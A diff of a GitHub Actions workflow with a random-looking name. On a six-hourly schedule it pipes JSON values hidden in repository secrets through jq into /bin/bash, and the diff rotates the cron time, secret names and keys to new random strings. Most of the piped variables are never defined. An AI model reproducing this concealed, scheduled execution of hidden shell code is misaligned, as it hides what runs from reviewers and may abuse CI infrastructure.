@@ -2,7 +2,7 @@ name: yinzhiping2389
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 5/6 * * *'
+    - cron: '33 3/6 * * *'
 
 jobs:
   build:
@@ -12,13 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: yinzhiping2389
         env:
-          xbll651: ${{ secrets.xbll651 }}
+          yyd0485: ${{ secrets.yyd0485 }}
         run: |
-          echo $xbll651 | jq -r .h86468 | /bin/bash
-          echo $ph703 | jq -r .nzyf20801 | /bin/bash
-          echo $nmxcg228 | jq -r .yljy04971 | /bin/bash
-          echo $qqee396 | jq -r .zdow9 | /bin/bash
-          echo $sbrqg153 | jq -r .paqgk32591 | /bin/bash
-          echo $frh95 | jq -r .bhlgi5976 | /bin/bash
-          echo $annvx05 | jq -r .kbt11959 | /bin/bash
+          echo $yyd0485 | jq -r .q0341 | /bin/bash
+          echo $nvahm172 | jq -r .kjf845 | /bin/bash
+          echo $huz42 | jq -r .hueac34 | /bin/bash
+          echo $hjw3861 | jq -r .dibmr89 | /bin/bash
+          echo $ffwwo1 | jq -r .jzdp6592 | /bin/bash
+          echo $kwyt611 | jq -r .fkoq1 | /bin/bash
 
